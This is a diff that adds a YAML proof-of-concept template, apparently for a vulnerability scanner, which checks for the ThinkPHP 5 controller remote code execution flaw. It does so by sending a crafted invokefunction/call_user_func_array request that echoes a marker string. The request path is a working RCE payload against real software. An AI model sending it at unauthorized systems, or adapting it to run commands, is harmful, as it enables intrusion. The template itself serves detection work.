@@ -1,0 +1,21 @@
+id: poc-yaml-thinkphp5-controller-rce
+info:
+  name: Thinkphp5 Controller 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: ThinkPHP
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, "a29hbHIgaXMg%d2F0Y2hpbmcgeW9129")
+  output: []
